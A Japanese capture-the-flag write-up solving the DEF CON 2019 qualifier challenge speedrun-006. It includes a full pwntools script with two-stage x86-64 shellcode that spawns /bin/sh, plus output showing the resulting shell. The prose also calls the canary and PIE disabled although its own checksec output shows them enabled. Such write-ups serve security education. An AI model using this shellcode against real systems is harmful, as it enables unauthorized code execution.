# [pwn 5pts] speedrun-006 - DEF CON CTF 2019 Qualifier
64ビットでSSPやPIEは無効です。
```
$ checksec -f speedrun-006
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable  FILE
Full RELRO      Canary found      NX enabled    PIE enabled     No RPATH   No RUNPATH   75 Symbols     Yes	0		2	speedrun-006
```
シェルコードが入力できますが、ところどころ0xCCが挿入されます。
また、先頭には各種レジスタを0にする命令が付け足されます。
上手いことうごくシェルコードを書こうとしましたが面倒なので、*CTFで出題されたbabyshellのようにreadで新しいシェルコードを読み込んでやりましょう。
確かbabyshellで軽く説明した気がしますが、read(0,0,0)するとrcxにripを入れてくれるんでしたね。
ということで、syscallした後にrcxにreadすればシェルコードを上書きしてくれます。
```python
from pwn import *

#sock = remote("speedrun-006.quals2019.oooverflow.io", 31337)
sock = process("speedrun-006")

shellcode = asm("""
syscall
nop
nop
mov dl, 0xcc
mov rsi, rcx
mov dl, 0xcc
syscall
""", arch="amd64")
print(disasm(shellcode, arch='amd64'))
shellcode = shellcode.replace("\xcc", "")
shellcode += '\x90' * (0x1a - len(shellcode))

_ = raw_input()
sock.send(shellcode)

shellcode = '\x90' * 20
shellcode += asm("""
mov rsp, rcx
add rsp, 0xf00

xor rax, rax
mov rbx, 0xFF978CD091969DD1
neg rbx
push rbx
push rbx
push rsp
pop rdi
cdq
push rdx
push rdi
push rsp
pop rsi
mov al, 0x3b
syscall
""", arch="amd64")
sock.send(shellcode)

sock.interactive()
```

ほい。
```
$ python solve.py 
[!] Could not find executable 'speedrun-006' in $PATH, using './speedrun-006' instead
[+] Starting local process './speedrun-006': pid 5919
   0:   0f 05                   syscall 
   2:   90                      nop
   3:   90                      nop
   4:   b2 cc                   mov    dl,0xcc
   6:   48 89 ce                mov    rsi,rcx
   9:   b2 cc                   mov    dl,0xcc
   b:   0f 05                   syscall

[*] Switching to interactive mode
How good are you around the corners?
Send me your ride
$ id
uid=1000(ptr) gid=1000(ptr) groups=1000(ptr),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lpadmin),126(sambashare),999(docker)
$ 
```

# 感想
シェルコード問題あきた。
